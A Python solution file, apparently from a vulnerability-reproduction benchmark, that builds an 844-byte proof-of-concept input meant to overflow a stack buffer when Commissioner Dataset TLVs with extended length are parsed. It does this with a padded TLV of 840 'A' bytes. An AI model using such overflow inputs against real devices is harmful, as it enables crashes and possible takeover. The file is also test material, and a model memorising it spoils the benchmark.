import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is in parsing Commissioner Dataset TLVs with extended length.
        # A common format for extended length TLVs is:
        # [Type (1B)] [0xFF (1B)] [Actual Length (e.g., 2B)] [Value (Actual Length)]
        #
        # The ground-truth PoC length is 844 bytes.
        # Let's assume the extended length field is 2 bytes.
        # Total Length = 1 (Type) + 1 (Marker) + 2 (Length) + Value Length
        # 844 = 4 + Value Length
        # => Value Length = 840 bytes.
        #
        # We construct a PoC with a value length of 840, which should be
        # large enough to overflow the stack buffer in the vulnerable function.

        # TLV Type (1 byte), using a placeholder value
        tlv_type = b'\x00'

        # Extended length marker (1 byte)
        length_marker = b'\xff'

        # Actual length (2 bytes, big-endian)
        overflow_length = 840
        packed_length = struct.pack('>H', overflow_length)

        # Payload to cause the overflow (840 bytes)
        payload = b'A' * overflow_length

        # Combine parts to form the final PoC
        poc = tlv_type + length_marker + packed_length + payload
        
        return poc